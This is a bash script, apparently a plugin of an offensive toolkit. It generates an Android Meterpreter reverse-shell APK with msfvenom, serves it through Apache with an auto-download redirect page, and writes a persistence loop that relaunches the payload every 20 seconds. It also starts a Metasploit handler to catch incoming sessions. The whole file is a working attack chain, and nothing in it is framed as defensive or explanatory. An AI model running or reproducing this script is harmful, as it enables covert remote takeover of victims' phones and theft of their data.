#!/usr/bin/env bash

source "plugins/common_checks.sh"

start_script() {
  clear && echo -en "\n Starting ${ScriptName} ... "
  
  check_ipmd && sudo service apache2 start
  
  msfvenom -p android/meterpreter/reverse_tcp LHOST="${LHOST}" LPORT="${LPORT}" -o "${Apk_Path}"
  
  cat >"${Index_Path}" <<-EOF
		<!DOCTYPE HTML>
		<html>
		<head>
		<meta http-equiv="refresh" content="0;url='/${APK_NAME}.apk'">
		</head>
		</html>
	EOF
  
  cat >"${Backdoor_Path}" <<-EOF
    #!/usr/bin/env bash
    while :
    do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
      sleep 20
    done
	EOF
  
  cat >"${Meterpreter_Path}" <<-EOF
		use exploit/multi/handler
		set PAYLOAD android/meterpreter/reverse_tcp
		set LHOST ${LHOST}
		set LPORT ${LPORT}
		set ExitOnSession false
		exploit -j -z
    clear
	EOF
  
  clear && echo -en "\n Starting Metasploit-Framework ... "
  
  msfconsole -q -r "${Meterpreter_Path}"
}

end_script() {
  clear && echo -en "\n EXITING SCRIPT ... "
  
  sudo rm -r "${Meterpreter_Path}"
  sudo rm -r "${Backdoor_Path}"
  sudo rm -r "${Index_Path}"
  sudo rm -r "${Apk_Path}"
  
  sudo service apache2 stop && clear && exit
}
